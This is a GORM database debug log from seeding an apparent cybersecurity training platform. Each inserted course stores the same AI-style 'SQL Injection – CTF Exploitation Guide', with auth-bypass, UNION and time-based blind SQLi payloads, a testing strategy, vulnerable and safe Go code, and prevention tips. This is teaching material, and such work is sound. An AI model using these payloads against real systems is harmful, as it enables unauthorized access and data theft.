| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,75) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.452ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[10.436ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.144','2025-06-09 14:07:55.144',NULL,'cyber security and xvobu','xdGWgFubqTalsCbfrLSBPDexRSeJPrvcMRvPIOmSScJrhfcYdtsIeJeKwcsjtdmOLesPgetRfyCPVWCQSLnTUKjJXCuMwdQtmttC',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.720ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.558ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 76 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.650ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.154','2025-06-09 14:07:55.154',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,76) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.506ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[13.804ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.161','2025-06-09 14:07:55.161',NULL,'cyber security and qldjb','iPvhZqEaYNdhVrVjronDGubkcGqLkigMZABQoMZnQYWtRpvwakfmZSeclvSSWJSUjBlvIqbwNmqIOnZrNDzDZdLARorKWKibuXHw',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.522ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.551ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 77 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.650ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.178','2025-06-09 14:07:55.178',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,77) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.473ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.316ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.185','2025-06-09 14:07:55.185',NULL,'cyber security and kxhcy','wluotEnvelfeufDdUsGPltbgINflpnNQXjPVWTBgjMZjMVbBzdsYkfuYiqwomRgVYbyZElhJNxqXkhexWqhWDgtkSSQzTxhBPgeV',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.494ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.475ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 78 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.483ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.192','2025-06-09 14:07:55.192',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,78) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[2.950ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.962ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.204','2025-06-09 14:07:55.204',NULL,'cyber security and iwjox','koYpgNNNLSpgoAOQymTkGhzJojLiLXyKINwFRHeJEMtNdXyABmKHbuBtYANddZXEvXYkhznptZvrRkqFzNCjDcIzjjfblpUlCawL',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.308ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.485ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 79 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.229ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.211','2025-06-09 14:07:55.211',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,79) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.500ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[10.665ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.221','2025-06-09 14:07:55.221',NULL,'cyber security and uisng','tXAKIzmIsysrJDEiuOZATbxnZIRuzlAGnHBGuqTBkWsfBFTBQClsGkMDVfIcOQxWvaQtuuneduBaNdjhilbGiRoOWWAVtFFNlGVJ',100,2) RETURNING "id"

